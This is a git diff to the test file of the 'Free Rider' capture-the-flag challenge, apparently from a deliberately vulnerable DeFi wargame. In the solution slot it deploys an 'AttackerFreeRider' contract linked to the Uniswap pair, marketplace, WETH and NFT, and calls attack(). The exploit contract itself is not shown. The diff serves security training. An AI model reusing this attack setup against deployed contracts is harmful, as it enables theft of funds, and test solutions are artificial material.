@@ -16,6 +16,11 @@ describe("[Challenge] Free Rider", function () {
     const AMOUNT_OF_NFTS = 6;
     const MARKETPLACE_INITIAL_ETH_BALANCE = 90n * 10n ** 18n;
 
+    const tokenIds = [];
+    for (let i = 0; i < AMOUNT_OF_NFTS; i++) {
+        tokenIds.push(i);
+    }
+
     const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
 
     const BOUNTY = 45n * 10n ** 18n;
@@ -86,8 +91,8 @@ describe("[Challenge] Free Rider", function () {
         await nft.setApprovalForAll(marketplace.address, true);
 
         // Open offers in the marketplace
-        await marketplace.offerMany([0, 1, 2, 3, 4, 5], [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]);
-        expect(await marketplace.offersCount()).to.be.eq(6);
+        await marketplace.offerMany(tokenIds, [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]);
+        expect(await marketplace.offersCount()).to.be.eq(tokenIds.length);
 
         // Deploy devs' contract, adding the player as the beneficiary
         devsContract = await (
@@ -101,6 +106,20 @@ describe("[Challenge] Free Rider", function () {
 
     it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
+        const AttackerFreeRiderFactory = await ethers.getContractFactory("AttackerFreeRider");
+        const attackerFreeRider = await AttackerFreeRiderFactory.deploy(
+            uniswapPair.address,
+            marketplace.address,
+            weth.address,
+            nft.address,
+            devsContract.address,
+            player.address,
+            NFT_PRICE,
+            tokenIds,
+            { value: ethers.utils.parseEther("0.05") } // give ETH for Uniswap fees
+        );
+
+        await attackerFreeRider.connect(player).attack();
     });
 
     after(async function () {
